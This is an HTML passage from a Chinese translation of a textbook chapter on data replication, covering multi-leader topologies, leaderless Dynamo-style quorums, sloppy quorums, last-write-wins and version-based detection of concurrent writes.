<li><strong>无冲突复制数据类型（Conflict-free replicated datatypes）</strong>（CRDT）【32,38】是可以由多个用户同时编辑的集合，映射，有序列表，计数器等的一系列数据结构，它们以合理的方式自动解决冲突。一些 CRDT 已经在 Riak 2.0 中实现【39,40】。</li>
<li><strong>可合并的持久数据结构（Mergeable persistent data structures）</strong>【41】显式跟踪历史记录，类似于 Git 版本控制系统，并使用三向合并功能（而 CRDT 使用双向合并）。</li>
<li><strong>可执行的转换（operational transformation）</strong>[42] 是 Etherpad 【30】和 Google Docs 【31】等合作编辑应用背后的冲突解决算法。它是专为同时编辑项目的有序列表而设计的，例如构成文本文档的字符列表。</li>
</ul>
<p>这些算法在数据库中的实现还很年轻，但很可能将来它们将被集成到更多的复制数据系统中。自动冲突解决方案可以使应用程序处理多领导者数据同步更为简单。</p>
</blockquote>
<h4 id="什么是冲突"><strong>什么是冲突？</strong></h4>
<p>有些冲突是显而易见的。在<a href="fig5-7.png">图 5-7</a> 的例子中，两个写操作并发地修改了同一条记录中的同一个字段，并将其设置为两个不同的值。毫无疑问这是一个冲突。</p>
<p>其他类型的冲突可能更为微妙，难以发现。例如，考虑一个会议室预订系统：它记录谁订了哪个时间段的哪个房间。应用需要确保每个房间只有一组人同时预定（即不得有相同房间的重叠预订）。在这种情况下，如果同时为同一个房间创建两个不同的预订，则可能会发生冲突。即使应用程序在允许用户进行预订之前检查可用性，如果两次预订是由两个不同的领导者进行的，则可能会有冲突。</p>
<p>现在还没有一个现成的答案，但在接下来的章节中，我们将追溯到对这个问题有很好的理解。我们将在第 7 章中看到更多的冲突示例，在<a href="https://vonng.gitbooks.io/ddia-cn/content/ch12.html">第 12 章</a>中我们将讨论用于检测和解决复制系统中冲突的可扩展方法。</p>
<h3 id="多主复制拓扑"><strong>多主复制拓扑</strong></h3>
<p>复制拓扑描述写入从一个节点传播到另一个节点的通信路径。如果你有两个领导者，如<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html">图 5-7</a> 所示，只有一个合理的拓扑结构：领导者 1 必须把他所有的写到领导者 2，反之亦然。有两个以上的领导，各种不同的拓扑是可能的。<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html">图 5-8</a> 举例说明了一些例子。</p>
<p><img src="fig5-8.png"></p>
<p><strong>图 5-8 三个可以设置多领导者复制的示例拓扑。</strong></p>
<p>最普遍的拓扑是全部到全部（[图 5-8 <a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html">c]</a>），其中每个领导者将其写入每个其他领导。但是，也会使用更多受限制的拓扑：例如，默认情况下，MySQL 仅支持<strong>环形拓扑（circular topology）</strong>【34】，其中每个节点接收来自一个节点的写入，并将这些写入（加上自己的任何写入）转发给另一个节点。另一种流行的拓扑结构具有星形的形状 <a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#fn_v">v</a>。个指定的根节点将写入转发给所有其他节点。星型拓扑可以推广到树。</p>
<blockquote>
<p>不要与星型模式混淆（请参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch2.html#分析模式：星型还是雪花">分析模式：星型还是雪花</a>”），其中描述了数据模型的结构，而不是节点之间的通信拓扑。</p>
</blockquote>
<p>在圆形和星形拓扑中，写入可能需要在到达所有副本之前通过多个节点。因此，节点需要转发从其他节点收到的数据更改。为了防止无限复制循环，每个节点被赋予一个唯一的标识符，并且在复制日志中，每个写入都被标记了所有已经通过的节点的标识符【43】。当一个节点收到用自己的标识符标记的数据更改时，该数据更改将被忽略，因为节点知道它已经被处理。</p>
<p>循环和星型拓扑的问题是，如果有节点发生故障，则可能会中断其他节点之间的复制消息流，导致它们无法通信，直到节点修复。拓扑结构可以重新配置为在发生故障的节点上工作，但在大多数部署中，这种重新配置必须手动完成。更密集连接的拓扑结构（例如全部到全部）的容错性更好，因为它允许消息沿着不同的路径传播，避免单点故障。</p>
<p>另一方面，全连接拓扑也可能有问题。特别是，一些网络链接可能比其他网络链接更快（例如，由于网络拥塞），结果是一些复制消息可能 “超过” 其他复制消息，如<a href="fig5-9.png">图 5-9</a> 所示。</p>
<p><img src="fig5-9.png"></p>
<p><strong>图 5-9 使用多主程序复制时，可能会在某些副本中写入错误的顺序。</strong></p>
<p>在<a href="fig5-9.png">图 5-9</a> 中，客户端 A 向 <strong>Leader One</strong> 的表中插入一行，客户端 B 在主库 3 上更新该行。然而，主库 2 可以以不同的顺序接收写入：它可以首先接收更新（其中，从它的角度来看，是对数据库中不存在的行的更新），并且仅在稍后接收到相应的插入（其应该在更新之前）。</p>
<p>这是一个因果关系的问题，类似于我们在 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch8.html#一致前缀读">一致前缀读</a>” 中看到的：更新取决于先前的插入，所以我们需要确保所有节点先处理插入，然后再处理更新。仅仅在每一次写入时添加一个时间戳是不够的，因为时钟不可能被充分地同步，以便在主库 2 处正确地排序这些事件（见<a href="https://vonng.gitbooks.io/ddia-cn/content/ch8.html">第 8 章</a>）。</p>
<p>要正确排序这些事件，可以使用一种称为<strong>版本向量（version vectors）</strong>的技术，本章稍后将讨论这种技术（参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#检测并发写入">检测并发写入</a>”）。然而，冲突检测技术在许多多领导者复制系统中执行得不好。例如，在撰写本文时，PostgreSQL BDR 不提供写入的因果排序【27】，而 Tungsten Replicator for MySQL 甚至不尝试检测冲突【34】。</p>
<p>如果您正在使用具有多领导者复制功能的系统，那么应该了解这些问题，仔细阅读文档，并彻底测试数据库，以确保它确实提供了您认为具有的保证。</p>
<h2 id="无主模型">无主模型</h2>
<blockquote>
<p>部分参考自 <strong><a href="https://ddia.qtmuniao.com/#/ch05?id=ddia-逐章精读（五）-冗余（replication">DDIA 逐章精读（五）: 冗余（Replication)</a></strong></p>
</blockquote>
<ul>
<li> 有主模型：由主副本决定写入顺序，从副本在写入上不直接和客户端打交道，只是重放其对应的主副本的写入顺序（也可以理解为主副本为从副本的客户端）。</li>
<li>无主模型：允许任何副本接受写入。</li>
</ul>
<p>在关系数据库时代，无主模型已经快被忘却。从 Amazon 的 Dynamo 论文开始，无主模型又重新大放异彩，Riak，Cassandra 和 Voldemort 都受其启发，可以统称为 <strong>Dynamo 流（Dynamo-style）</strong>。</p>
<blockquote>
<p>奇特的是，Amazon 的一款数据库产品 DynamoDB，和 Dynamo 并不是一个东西。</p>
</blockquote>
<p>通常来说，在无主模型中，写入时可以：</p>
<ol type="1">
<li>由客户端直接写入副本。</li>
<li>由<strong>协调者（coordinator）</strong> 接收写入，转发给多副本。但与主副本不同，协调者并不执行特定的写入顺序。</li>
</ol>
<p>这种设计上的差异对数据库的使用方式有着深远的影响。</p>
<h3 id="有节点故障时的写入"><strong>有节点故障时的写入</strong></h3>
<p>基于主副本（leader-based）的模型，在有副本故障时，需要进行故障切换。</p>
<p>在无领导配置中，故障切换不存在。<a href="fig5-10.png">图 5-10</a> 显示了发生了什么事情：客户端（用户 1234）并行发送写入到所有三个副本，并且两个可用副本接受写入，但是不可用副本错过了它。假设三个副本中的两个承认写入是足够的：在用户 1234 已经收到两个确定的响应之后，我们认为写入成功。客户简单地忽略了其中一个副本错过了写入的事实。</p>
<p><img src="fig5-10.png"></p>
<p>由于写入时，简单的忽略了宕机副本；在读取时，就要多做些事情了：<strong>同时读取多个副本，选取最新 * 版本 * 的值</strong>。</p>
<p><strong>读修复和反熵</strong>复制方案应确保最终将所有数据复制到每个副本。在一个不可用的节点重新联机之后，它如何赶上它错过的写入？</p>
<p>在 Dynamo 风格的数据存储中经常使用两种机制：</p>
<p><strong>读修复（Read repair）</strong></p>
<p>当客户端并行读取多个节点时，它可以检测到任何陈旧的响应。例如，在<a href="fig5-10.png">图 5-10</a> 中，用户 2345 获得了来自 Replica 3 的版本 6 值和来自副本 1 和 2 的版本 7 值。客户端发现副本 3 具有陈旧值，并将新值写回复制品。这种方法适用于频繁阅读的值。</p>
<p><strong>反熵过程（Anti-entropy process）</strong></p>
<p>此外，一些数据存储具有后台进程，不断查找副本之间的数据差异，并将任何缺少的数据从一个副本复制到另一个副本。与基于领导者的复制中的复制日志不同，此反熵过程不会以任何特定的顺序复制写入，并且在复制数据之前可能会有显著的延迟。</p>
<p>并不是所有的系统都实现了这两个；例如，Voldemort 目前没有反熵过程。请注意，如果没有反熵过程，某些副本中很少读取的值可能会丢失，从而降低了持久性，因为只有在应用程序读取值时才执行读修复。</p>
<h4 id="读写的法定人数"><strong>读写的法定人数</strong></h4>
<p>如果有 n 个副本，每个写入必须由 w 节点确认才能被认为是成功的，并且我们必须至少为每个读取查询 r 个节点。 （在我们的例子中，<span class="math inline">\(n = 3，w = 2，r = 2\)</span>）。只要<span class="math inline"> \(w + r&gt; n\)</span>，我们期望在读取时获得最新的值，因为 r 个读取中至少有一个节点是最新的。遵循这些 r 值，w 值的读写称为<strong>法定人数（quorum）</strong>的读和写。【44】 ，你可以认为，r 和 w 是有效读写所需的最低票数。</p>
<p>在 Dynamo 风格的数据库中，参数 n，w 和 r 通常是可配置的。一个常见的选择是使 n 为奇数（通常为 3 或 5）并设置 <span class="math inline">\(w = r =（n + 1）/ 2\)</span>（向上取整）。但是可以根据需要更改数字。例如，设置<span class="math inline"> \(w = n\)</span> 和<span class="math inline"> \(r = 1\)</span> 的写入很少且读取次数较多的工作负载可能会受益。这使得读取速度更快，但具有只有一个失败节点导致所有数据库写入失败的缺点。</p>
<blockquote>
<p>集群中可能有多于 n 的节点。（集群的机器数可能多于副本数目），但是任何给定的值只能存储在 n 个节点上。 这允许对数据集进行分区，从而支持可以放在一个节点上的数据集更大的数据集。 将在第 6 章回到分区。</p>
</blockquote>
<p>仲裁条件<span class="math inline"> \(w + r&gt; n\)</span> 允许系统容忍不可用的节点：</p>
<ul>
<li>如果<span class="math inline"> \(w &lt;n\)</span>，如果节点不可用，我们仍然可以处理写入。</li>
<li>如果<span class="math inline"> \(r &lt;n\)</span>，如果节点不可用，我们仍然可以处理读取。</li>
<li>对于<span class="math inline"> \(n = 3，w = 2，r = 2\)</span>，我们可以容忍一个不可用的节点。</li>
<li>对于<span class="math inline"> \(n = 5，w = 3，r = 3\)</span>，我们可以容忍两个不可用的节点。 这个案例如<a href="fig5-11.png">图 5-11</a> 所示。</li>
<li>通常，读取和写入操作始终并行发送到所有 n 个副本。 参数 w 和 r 决定我们等待多少个节点，即在我们认为读或写成功之前，有多少个节点需要报告成功。</li>
</ul>
<p><img src="fig5-11.png"></p>
<p><strong>图 5-11 如果<span class="math inline"> \(w + r &gt; n\)</span>，读取 r 个副本，至少有一个 r 副本必然包含了最近的成功写入</strong></p>
<p>如果少于所需的 w 或 r 节点可用，则写入或读取将返回错误。 由于许多原因，节点可能不可用：因为由于执行操作的错误（由于磁盘已满而无法写入）导致节点关闭（崩溃，关闭电源），由于客户端和服务器之间的网络中断 节点，或任何其他原因。 我们只关心节点是否返回了成功的响应，而不需要区分不同类型的错误。</p>
<h3 id="仲裁一致性的局限性"><strong>仲裁一致性的局限性</strong></h3>
<p>如果有 n 个副本，选择 w 和 r 使得<span class="math inline"> \(w + r&gt; n\)</span>，通常可以期望每个读取返回为一个键写的最近的值。</p>
<ul>
<li>写节点集合和读节点集合必然存在重叠。</li>
<li>读节点中必须至少有一个具有最新值的节点（如<a href="fig5-11.png">图 5-11</a> 所示）</li>
</ul>
<p>通常，r 和 w 被选为多数（超过 <span class="math inline">\(n/2\)</span> ）节点，因为这确保了<span class="math inline"> \(w + r&gt; n\)</span>，同时仍然容忍多达<span class="math inline"> \(n/2\)</span> 个节点故障。但是，法定人数不一定必须是大多数，只是读写使用的节点交集至少需要包括一个节点。其他法定人数的配置是可能的，这使得分布式算法的设计有一定的灵活性【45】。</p>
<p>您也可以将 w 和 r 设置为较小的数字，以使<span class="math inline"> \(w + r≤n\)</span>（即法定条件不满足）。在这种情况下，读取和写入操作仍将被发送到 n 个节点，但操作成功只需要少量的成功响应。</p>
<p>较小的 w 和 r 更有可能会读取过时的数据，因为您的读取更有可能不包含具有最新值的节点。另一方面，这种配置允许更低的延迟和更高的可用性：如果存在网络中断，并且许多副本变得无法访问，则可以继续处理读取和写入的机会更大。只有当可达副本的数量低于 w 或 r 时，数据库才分别变得不可用于写入或读取。</p>
<p>但是，即使在<span class="math inline"> \(w + r&gt; n\)</span> 的情况下，也可能存在返回陈旧值的边缘情况。这取决于实现，但可能的情况包括：</p>
<ul>
<li>如果使用松散的法定人数（见 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#松散法定人数与带提示的接力">松散法定人数与带提示的接力</a>”），w 个写入和 r 个读取落在完全不同的节点上，因此 r 节点和 w 之间不再保证有重叠节点【46】。</li>
<li>如果两个写入同时发生，不清楚哪一个先发生。在这种情况下，唯一安全的解决方案是合并并发写入（请参阅第 171 页的 “处理写入冲突”）。如果根据时间戳（最后写入胜利）挑选出胜者，则由于时钟偏差 [35]，写入可能会丢失。</li>
<li>如果写操作与读操作同时发生，写操作可能仅反映在某些副本上。在这种情况下，不确定读取是返回旧值还是新值。</li>
<li>如果写操作在某些副本上成功，而在其他节点上失败（例如，因为某些节点上的磁盘已满），在小于 w 个副本上写入成功。所以整体判定写入失败，但整体写入失败并没有在写入成功的副本上回滚。这意味着如果一个写入虽然报告失败，后续的读取仍然可能会读取这次失败写入的值【47】。</li>
<li>如果携带新值的节点失败，需要读取其他带有旧值的副本。并且其数据从带有旧值的副本中恢复，则存储新值的副本数可能会低于 w，从而打破法定人数条件。</li>
<li>即使一切工作正常，有时也会不幸地出现关于<strong>时序（timing）</strong>的边缘情况</li>
</ul>
<p>因此，尽管法定人数似乎保证读取返回最新的写入值，但在实践中并不那么简单。 Dynamo 风格的数据库通常针对可以忍受最终一致性的用例进行优化。允许通过参数 w 和 r 来调整读取陈旧值的概率，但把它们当成绝对的保证是不明智的。</p>
<p>尤其是，通常没有得到 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#">与延迟有关的问题</a>”（读取您的写入，单调读取或一致的前缀读取）中讨论的保证，因此前面提到的异常可能会发生在应用程序中。更强有力的保证通常需要<strong>事务</strong>或<strong>共识</strong>。我们将在<a href="https://vonng.gitbooks.io/ddia-cn/content/ch7.html">第七章</a>和<a href="https://vonng.gitbooks.io/ddia-cn/content/ch9.html">第九章</a>回到这些话题。</p>
<h4 id="监控落后程度"><strong>监控落后程度</strong></h4>
<p>从运维的角度来看，监视数据库是否返回最新的结果是很重要的。即使应用可以容忍陈旧的读取，您也需要了解复制的健康状况。如果显著落后，应该提醒您，以便您可以调查原因（例如，网络中的问题或超载节点）。</p>
<p>对于基于领导者的复制，数据库通常会公开复制滞后的度量标准，您可以将其提供给监视系统。这是可能的，因为写入按照相同的顺序应用于领导者和追随者，并且每个节点在复制日志中具有一个位置（在本地应用的写入次数）。通过从领导者的当前位置中减去随从者的当前位置，您可以测量复制滞后量。</p>
<p>然而，在无领导者复制的系统中，没有固定的写入顺序，这使得监控变得更加困难。而且，如果数据库只使用读修复（没有反熵过程），那么对于一个值可能会有多大的限制是没有限制的 - 如果一个值很少被读取，那么由一个陈旧副本返回的值可能是古老的。</p>
<p>已经有一些关于衡量无主复制数据库中的复制陈旧度的研究，并根据参数 n，w 和 r 来预测陈旧读取的预期百分比【48】。不幸的是，这还不是很常见的做法，但是将过时测量值包含在数据库的标准度量标准中是一件好事。最终的一致性是故意模糊的保证，但是对于可操作性来说，能够量化 “最终” 是很重要的。</p>
<h4 id="松散法定人数与带提示的接力"><strong>松散法定人数与带提示的接力</strong></h4>
<p>合理配置的法定人数可以使数据库无需故障切换即可容忍个别节点的故障。也可以容忍个别节点变慢，因为请求不必等待所有 n 个节点响应 —— 当 w 或 r 节点响应时它们可以返回。对于需要高可用、低延时、且能够容忍偶尔读到陈旧值的应用场景来说，这些特性使无主复制的数据库很有吸引力。</p>
<p>然而，法定人数（如迄今为止所描述的）并不像它们可能的那样具有容错性。网络中断可以很容易地将客户端从大量的数据库节点上切断。虽然这些节点是活着的，而其他客户端可能能够连接到它们，但是从数据库节点切断的客户端，它们也可能已经死亡。在这种情况下，剩余的可用节点可能会少于可用节点，因此客户端可能无法达到法定人数。</p>
<p>在一个大型的群集中（节点数量明显多于 n 个），网络中断期间客户端可能连接到某些数据库节点，而不是为了为特定值组成法定人数的节点们。在这种情况下，数据库设计人员需要权衡一下：</p>
<ul>
<li>将错误返回给我们无法达到 w 或 r 节点的法定数量的所有请求是否更好？</li>
<li>或者我们是否应该接受写入，然后将它们写入一些可达的节点，但不在 n 值通常存在的 n 个节点之间？</li>
</ul>
<p>后者被认为是一个<strong>松散的法定人数（sloppy quorum）</strong>【37】：写和读仍然需要 w 和 r 成功的响应，但是那些可能包括不在指定的 n 个 “主” 节点中的值。比方说，如果你把自己锁在房子外面，你可能会敲开邻居的门，问你是否可以暂时停留在沙发上。</p>
<p>一旦网络中断得到解决，代表另一个节点临时接受的一个节点的任何写入都被发送到适当的 “本地” 节点。这就是所谓的<strong>带提示的接力（hinted handoff）</strong>。 （一旦你再次找到你的房子的钥匙，你的邻居礼貌地要求你离开沙发回家。）</p>
<p>松散法定人数对写入可用性的提高特别有用：只要有任何 w 节点可用，数据库就可以接受写入。然而，这意味着即使当<span class="math inline"> \(w + r&gt; n\)</span> 时，也不能确定读取某个键的最新值，因为最新的值可能已经临时写入了 n 之外的某些节点【47】。</p>
<p>因此，在传统意义上，一个松散的法定人数实际上不是一个法定人数。这只是一个保证，即数据存储在 w 节点的地方。不能保证 r 节点的读取直到提示已经完成。</p>
<p>在所有常见的 Dynamo 实现中，松散法定人数是可选的。在 Riak 中，它们默认是启用的，而在 Cassandra 和 Voldemort 中它们默认是禁用的【46,49,50】。</p>
<h4 id="运维多个数据中心-1"><strong>运维多个数据中心</strong></h4>
<p>无主复制适用于多数据中心操作，因为它旨在容忍冲突的并发写入，网络中断和延迟尖峰。</p>
<p>Cassandra 和 Voldemort 在正常的无主模型中实现了他们的多数据中心支持：副本的数量 n 包括所有数据中心的节点，在配置中，您可以指定每个数据中心中您想拥有的副本的数量。无论数据中心如何，每个来自客户端的写入都会发送到所有副本，但客户端通常只等待来自其本地数据中心内的法定节点的确认，从而不会受到跨数据中心链路延迟和中断的影响。对其他数据中心的高延迟写入通常被配置为异步发生，尽管配置有一定的灵活性【50,51】。</p>
<p>Riak 将客户端和数据库节点之间的所有通信保持在一个数据中心本地，因此 n 描述了一个数据中心内的副本数量。数据库集群之间的跨数据中心复制在后台异步发生，其风格类似于多领导者复制【52】。</p>
<h3 id="检测并发写入"><strong>检测并发写入</strong></h3>
<p>Dynamo 风格的数据库允许多个客户端同时写入相同的 Key，这意味着即使使用严格的法定人数也会发生冲突。这种情况与多领导者复制相似（参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#处理写入冲突">处理写入冲突</a>”），但在 Dynamo 样式的数据库中，在<strong>读修复</strong>或<strong>带提示的接力</strong>期间也可能会产生冲突。</p>
<p>问题在于，由于可变的网络延迟和部分故障，事件可能在不同的节点以不同的顺序到达。例如，<a href="fig5-12.png">图 5-12</a> 显示了两个客户机 A 和 B 同时写入三节点数据存储区中的键 X：</p>
<ul>
<li>节点 1 接收来自 A 的写入，但由于暂时中断，从不接收来自 B 的写入。</li>
<li>节点 2 首先接收来自 A 的写入，然后接收来自 B 的写入。</li>
<li>节点 3 首先接收来自 B 的写入，然后从 A 写入。</li>
</ul>
<p><img src="fig5-12.png"></p>
<p><strong>图 5-12 并发写入 Dynamo 风格的数据存储：没有明确定义的顺序。</strong></p>
<p>如果每个节点只要接收到来自客户端的写入请求就简单地覆盖了某个键的值，那么节点就会永久地不一致，如<a href="fig5-12.png">图 5-12</a> 中的最终获取请求所示：节点 2 认为 X 的最终值是 B，而其他节点认为值是 A 。</p>
<p>为了最终达成一致，副本应该趋于相同的值。如何做到这一点？有人可能希望复制的数据库能够自动处理，但不幸的是，大多数的实现都很糟糕：如果你想避免丢失数据，你（应用程序开发人员）需要知道很多有关数据库冲突处理的内部信息。</p>
<p>在 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#处理写入冲突">处理写冲突</a>” 一节中已经简要介绍了一些解决冲突的技术。在总结本章之前，让我们来更详细地探讨这个问题。</p>
<h4 id="最后写入胜利丢弃并发写入"><strong>最后写入胜利（丢弃并发写入）</strong></h4>
<p>实现最终融合的一种方法是声明每个副本只需要存储最 <strong>“最近”</strong> 的值，并允许 <strong>“更旧”</strong> 的值被覆盖和抛弃。只要有一种明确的方式来确定哪个写是 “最近的”，并且每个写入最终都被复制到每个副本，那么复制最终会收敛到相同的值。</p>
<p>正如 <strong>“最近”</strong> 的引号所表明的，这个想法其实颇具误导性。在<a href="fig5-12.png">图 5-12</a> 的例子中，当客户端向数据库节点发送写入请求时，客户端都不知道另一个客户端，因此不清楚哪一个先发生了。事实上，说 “发生” 是没有意义的：我们说写入是<strong>并发（concurrent）</strong>的，所以它们的顺序是不确定的。</p>
<p>即使写入没有自然的排序，我们也可以强制任意排序。例如，可以为每个写入附加一个时间戳，挑选最 <strong>“最近”</strong> 的最大时间戳，并丢弃具有较早时间戳的任何写入。这种冲突解决算法被称为<strong>最后写入胜利（LWW, last write wins）</strong>，是 Cassandra 【53】唯一支持的冲突解决方法，也是 Riak 【35】中的一个可选特征。</p>
<p>LWW 实现了最终收敛的目标，但以<strong>持久性</strong>为代价：如果同一个 Key 有多个并发写入，即使它们都被报告为客户端成功（因为它们被写入 w 个副本），但只有一个写入将存活，而其他写入将被静默丢弃。此外，LWW 甚至可能会删除不是并发的写入，我们将在的 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch8.html#有序事件的时间戳">有序事件的时间戳</a>” 中讨论。</p>
<ul>
<li>有一些情况，如缓存，其中丢失的写入可能是可以接受的。</li>
<li>如果丢失数据不可接受，LWW 是解决冲突的一个很烂的选择。</li>
</ul>
<p>在数据库中使用 LWW 的唯一安全方法是使用唯一的、不可变的 key，从而避免对同一个 key 进行并发更新。例如，Cassandra 推荐使用的方法是使用 UUID 作为键，从而为每个写操作提供一个唯一的键【53】。</p>
<h4 id="happens-before关系和并发"><strong>“happens before” 关系和并发</strong></h4>
<p>如何判断两个操作是否是并发的：</p>
<ul>
<li>在<a href="https://vonng.gitbooks.io/ddia-cn/content/fig5-9.png">图 5-9</a> 中，两个写入不是并发的：A 的插入发生在 B 的递增之前，因为 B 递增的值是 A 插入的值。换句话说，B 的操作建立在 A 的操作上，所以 B 的操作必须在 A 之后发生。我们也可以说 B 是<strong>因果依赖（causally dependent）</strong>于 A</li>
<li> 另一方面，<a href="https://vonng.gitbooks.io/ddia-cn/content/fig5-12.png">图 5-12</a> 中的两个写入是并发的：当每个客户端启动操作时，它不知道另一个客户端也正在执行操作同样的 Key。因此，操作之间不存在因果关系。</li>
</ul>
<p>定义 A happens before B：操作 B 了解操作 A，或者依赖于 A，或者以某种方式构建于操作 A 之上</p>
<p>如果两个操作都不在另一个之前发生，那么两个操作是并发的。</p>
<p>因此，两个操作 A 和 B 的关系，只有三种可能性：</p>
<ul>
<li>A happens before B</li>
<li>B happens before A</li>
<li>A 和 B 并发</li>
</ul>
<p>我们需要的是一个算法来告诉我们两个操作是否是并发的。如果一个操作发生在另一个操作之前，则后面的操作应该覆盖较早的操作，但是如果这些操作是并发的，则存在需要解决的冲突。</p>
<blockquote>
<p>并发性，时间和相对性</p>
<p>如果两个操作 <strong>“同时”</strong> 发生，似乎应该称为并发 —— 但事实上，它们在字面时间上重叠与否并不重要。由于分布式系统中的时钟问题，现实中是很难判断两个事件是否<strong>同时</strong>发生的，这个问题我们将在<a href="https://vonng.gitbooks.io/ddia-cn/content/ch8.html">第 8 章</a>中详细讨论。</p>
<p>为了定义并发性，确切的时间并不重要：如果两个操作都意识不到对方的存在，就称这两个操作<strong>并发</strong>，而不管它们发生的物理时间。人们有时把这个原理和狭义相对论的物理学联系起来【54】，它引入了信息不能比光速更快的思想。因此，如果事件之间的时间短于光通过它们之间的距离，那么发生一定距离的两个事件不可能相互影响。</p>
<p>在计算机系统中，即使光速原则上允许一个操作影响另一个操作，但两个操作也可能是<strong>并行的</strong>。例如，如果网络缓慢或中断，两个操作间可能会出现一段时间间隔，且仍然是并发的，因为网络问题阻止一个操作意识到另一个操作的存在。</p>
</blockquote>
<h4 id="捕获happens-before关系"><strong>捕获 "happens-before" 关系</strong></h4>
<p>来看一个算法，它确定两个操作是否为并发的，还是一个在另一个之前。为了简单起见，我们从一个只有一个副本的数据库开始。一旦我们已经制定了如何在单个副本上完成这项工作，我们可以将该方法概括为具有多个副本的无领导者数据库。</p>
<p><a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html">图 5-13</a> 显示了两个客户端同时向同一购物车添加项目。 （如果这样的例子让你觉得太麻烦了，那么可以想象，两个空中交通管制员同时把飞机添加到他们正在跟踪的区域）最初，购物车是空的。在它们之间，客户端向数据库发出五次写入：</p>
<ol type="1">
<li>客户端 1 将牛奶加入购物车。这是该键的第一次写入，服务器成功存储了它并为其分配版本号 1，最后将值与版本号一起回送给客户端。</li>
<li>客户端 2 将鸡蛋加入购物车，不知道客户端 1 同时添加了牛奶（客户端 2 认为它的鸡蛋是购物车中的唯一物品）。服务器为此写入分配版本号 2，并将鸡蛋和牛奶存储为两个单独的值。然后它将这两个值<strong>都</strong>反回给客户端 2 ，并附上版本号 2 。</li>
<li>客户端 1 不知道客户端 2 的写入，想要将面粉加入购物车，因此认为当前的购物车内容应该是 [牛奶，面粉]。它将此值与服务器先前向客户端 1 提供的版本号 1 一起发送到服务器。服务器可以从版本号中知道 [牛奶，面粉] 的写入取代了 [牛奶] 的先前值，但与 [鸡蛋] 的值是<strong>并发</strong>的。因此，服务器将版本 3 分配给 [牛奶，面粉]，覆盖版本 1 值 [牛奶]，但保留版本 2 的值 [蛋]，并将所有的值返回给客户端 1 。</li>
<li>同时，客户端 2 想要加入火腿，不知道客端户 1 刚刚加了面粉。客户端 2 在最后一个响应中从服务器收到了两个值 [牛奶] 和 [蛋]，所以客户端 2 现在合并这些值，并添加火腿形成一个新的值，[鸡蛋，牛奶，火腿]。它将这个值发送到服务器，带着之前的版本号 2 。服务器检测到新值会覆盖版本 2 [鸡蛋]，但新值也会与版本 3 [牛奶，面粉] <strong>并发</strong>，所以剩下的两个是 v3 [牛奶，面粉]，和 v4：[鸡蛋，牛奶，火腿]</li>
<li> 最后，客户端 1 想要加培根。它以前在 v3 中从服务器接收 [牛奶，面粉] 和 [鸡蛋]，所以它合并这些，添加培根，并将最终值 [牛奶，面粉，鸡蛋，培根] 连同版本号 v3 发往服务器。这会覆盖 v3 [牛奶，面粉]（请注意 [鸡蛋] 已经在最后一步被覆盖），但与 v4 [鸡蛋，牛奶，火腿] 并发，所以服务器保留这两个并发值。</li>
</ol>
<p><img src="fig5-13.png"></p>
<p><strong>图 5-13 捕获两个客户端之间的因果关系，同时编辑购物车。</strong></p>
<p><a href="fig5-13.png">图 5-13</a> 中的操作之间的数据流如<a href="fig5-14.png">图 5-14</a> 所示。 箭头表示哪个操作发生在其他操作之前，意味着后面的操作知道或依赖于较早的操作。 在这个例子中，客户端永远不会完全掌握服务器上的数据，因为总是有另一个操作同时进行。 但是，旧版本的值最终会被覆盖，并且不会丢失任何写入。</p>
<p><img src="fig5-14.png"></p>
<p><strong>图 5-14 图 5-13 中的因果依赖关系图。</strong></p>
<p>请注意，服务器可以通过查看版本号来确定两个操作是否是并发的 —— 它不需要解释该值本身（因此该值可以是任何数据结构）。该算法的工作原理如下：</p>
<ul>
<li>服务器为每个键保留一个版本号，每次写入键时都增加版本号，并将新版本号与写入的值一起存储。</li>
<li>当客户端读取键时，服务器将返回所有未覆盖的值以及最新的版本号。客户端在写入前必须读取。</li>
<li>客户端写入键时，必须包含之前读取的版本号，并且必须将之前读取的所有值合并在一起。 （来自写入请求的响应可以像读取一样，返回所有当前值，这使得我们可以像购物车示例那样连接多个写入。）</li>
<li>当服务器接收到具有特定版本号的写入时，它可以覆盖该版本号或更低版本的所有值（因为它知道它们已经被合并到新的值中），但是它必须保持所有值更高版本号（因为这些值与传入的写入同时发生）。</li>
</ul>
<p>当一个写入包含前一次读取的版本号时，它会告诉我们写入的是哪一种状态。如果在不包含版本号的情况下进行写操作，则与所有其他写操作并发，因此它不会覆盖任何内容 —— 只会在随后的读取中作为其中一个值返回。</p>
<h4 id="合并同时写入的值"><strong>合并同时写入的值</strong></h4>
<p>这种算法可以确保没有数据被无声地丢弃，但不幸的是，客户端需要做一些额外的工作：如果多个操作并发发生，则客户端必须通过合并并发写入的值来擦屁股。 Riak 称这些并发值<strong>兄弟（siblings）</strong>。</p>
<p>合并兄弟值，本质上是与多领导者复制中的冲突解决相同的问题，我们先前讨论过（参阅 “<a href="https://vonng.gitbooks.io/ddia-cn/content/ch5.html#处理写入冲突">处理写入冲突</a>”）。一个简单的方法是根据版本号或时间戳（最后写入胜利）选择一个值，但这意味着丢失数据。所以，你可能需要在应用程序代码中做更聪明的事情。</p>
<p>以购物车为例，一种合理的合并兄弟方法就是集合求并。在<a href="fig5-14.png">图 5-14</a> 中，最后的两个兄弟是 [牛奶，面粉，鸡蛋，熏肉] 和 [鸡蛋，牛奶，火腿]。注意牛奶和鸡蛋出现在两个，即使他们每个只写一次。合并的价值可能是像 [牛奶，面粉，鸡蛋，培根，火腿]，没有重复。</p>
